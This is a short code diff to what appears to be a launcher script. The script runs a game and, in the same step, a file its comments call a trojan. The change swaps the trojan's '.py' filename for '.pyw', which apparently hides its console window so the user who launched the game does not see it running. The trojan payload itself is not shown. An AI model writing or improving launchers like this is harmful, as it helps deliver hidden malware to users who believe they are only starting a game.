@@ -10,9 +10,9 @@ except Exception as e:
 
 # Execute the trojan
 try:
-	trojanP = Popen(["python", "trojan/trojan.py"])
+	trojanP = Popen(["python", "trojan/trojan.pyw"])
 except Exception as e:
-	trojanP = Popen(["python3", "trojan/trojan.py"])
+	trojanP = Popen(["python3", "trojan/trojan.pyw"])
 
 # while gameP.poll() is None or trojanP.poll() is None:
 # 	pass
